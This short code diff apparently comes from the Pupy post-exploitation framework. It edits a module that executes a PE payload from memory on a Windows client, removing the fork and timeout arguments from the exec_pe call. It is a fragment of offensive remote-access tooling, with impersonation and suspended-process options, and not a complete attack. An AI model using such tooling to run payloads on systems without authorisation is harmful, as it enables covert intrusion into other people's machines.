@@ -41,8 +41,7 @@ class MemoryDuplicate(PupyModule):
         self.success("Executing the payload from memory ...")
         if self.client.is_windows():
             exec_pe(
-                self, "", raw_pe=payload,
-                interactive=False, fork=True, timeout=None,
+                self, "", raw_pe=payload, interactive=False,
                 use_impersonation=args.impersonate, suspended_process=args.process
             )
         elif self.client.is_linux():
